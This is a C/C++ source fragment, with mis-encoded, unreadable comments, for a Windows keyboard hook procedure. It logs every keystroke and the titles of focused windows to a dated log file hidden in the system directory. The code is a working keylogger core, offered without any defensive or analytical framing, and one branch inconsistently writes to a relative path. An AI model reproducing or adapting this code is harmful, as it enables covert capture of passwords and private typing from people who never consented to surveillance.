HHOOK g_hHook = NULL;           //ȫ�ֹ��Ӻ������
HWND  g_hLastFocus = NULL;         //�������


//���̹��Ӻ���
LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	FILE* out;
	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;

	char filename[100] ={0};//�����ļ���

	sprintf(filename,"Key_%d_%d_%d.log",m_nYear,m_nMonth,m_nDay);

	char syspath[MAX_PATH] ={0};

	GetSystemDirectory(syspath,MAX_PATH);

	strcat(syspath,"\\");
	strcat(syspath,filename);
	
	if(nCode<0)
		return CallNextHookEx(g_hHook,nCode,wParam,lParam); 
	
	if(nCode==HC_ACTION)//HC_ACTION����lParamָ��һ��Ϣ�ṹ
	{     
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN)//�ж��Ƿ��ǻ�����Ϣ
		{   
			DWORD dwCount; 
			char svBuffer[256]; 
			int vKey,nScan; 
			vKey=LOBYTE(pEvt->paramL); 
			nScan=HIBYTE(pEvt->paramL);//ɨ����
			nScan<<=16; 
			
			//��鵱ǰ���ڽ����Ƿ�ı�
			HWND hFocus=GetActiveWindow(); 
			if(g_hLastFocus!=hFocus)
			{//���洰�ڱ��⵽�ļ��� 
				char svTitle[256]; 
				int nCount; 
				nCount=GetWindowText(hFocus,svTitle,256); 
				if(nCount>0)
				{ 
					out=fopen(syspath,"a+");
					fprintf(out,"\r\n---�����[%s]---\r\n",svTitle);
					fclose(out);
				} 
				g_hLastFocus=hFocus; 
			} 
			
			// Write out key 
			dwCount=GetKeyNameText(nScan,svBuffer,256); 
			if(dwCount)//������������������֮��
			{
				if(vKey==VK_SPACE)
				{
					svBuffer[0]=' '; 
					svBuffer[1]='\0'; 
					dwCount=1; 
				} 
				
				if(dwCount==1)//�������ͨ�������Ӧ��ascii������ļ�
				{   
					BYTE kbuf[256]; 
					WORD ch; 
					int chcount; 
					
					GetKeyboardState(kbuf);
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					/*���ݵ�ǰ��ɨ����ͼ�����Ϣ����һ�������ת����ASCII�ַ�*/
					if(chcount>0)
					{
						out=fopen(syspath,"a+");
						fprintf(out,"%c",char(ch));
						fclose(out);
					}
				}
				else//�����Ctrl��Alt֮����ֱ�ӽ���������������ļ�
				{       
					//����Ϊ�ø����Ҿ�û�취��
					out=fopen(filename,"a+");
					fprintf(out,"[%s]",svBuffer);
					fclose(out);
					if(vKey==VK_RETURN)//�س�
					{
						out=fopen(syspath,"a+");
						fprintf(out,"\r\n");
						fclose(out);
					}
					
				} 
			} 
		} 
	} 
	return CallNextHookEx(g_hHook,nCode,wParam,lParam); 
}